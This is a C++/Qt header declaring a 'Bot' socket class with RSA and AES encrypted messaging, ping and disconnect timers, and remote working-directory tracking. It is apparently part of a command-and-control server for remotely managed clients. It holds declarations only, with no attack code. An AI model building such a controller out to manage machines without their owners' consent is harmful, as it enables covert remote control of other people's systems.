#ifndef BOT_H
#define BOT_H

#include <QTcpSocket>
#include <QHostAddress>
#include <QMutex>
#include <QTimer>

#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/rsa.h>
#include <cryptopp/modes.h>
#include <cryptopp/osrng.h>

using namespace CryptoPP;
using std::string;

class Bot : public QTcpSocket
{
    Q_OBJECT
    public:
        explicit Bot(qintptr handle, RSA::PrivateKey *key, QObject *parent = 0);
        ~Bot();

        bool operator < (const Bot &bot) { return this->socketDescriptor() < bot.socketDescriptor(); }

        QByteArray getCWD();

    private:
        QTimer *ping, *disconnectTimer;
        QMutex writing;
        QString currentDirectory;

        AutoSeededRandomPool rng;

        CFB_Mode<AES>::Encryption *cfbEncryption;
        CFB_Mode<AES>::Decryption *cfbDecryption;

        RSAES_OAEP_SHA_Decryptor *RSAdecryptor;
        RSA::PrivateKey *privateKey;
        QByteArray decrypt(QByteArray);
        QByteArray encrypt(QByteArray);

        void initRSA();
        QByteArray decryptRSA(QByteArray);


    signals:
        void deleteMe(Bot*);
        void dataAvailable(Bot *, QByteArray);

    public slots:
        void readSomething();
        void safeWrite(QByteArray);

    private slots:
        void initAES();
        void timeToPing();
        void timeToDisconnect();
};

#endif // BOT_H
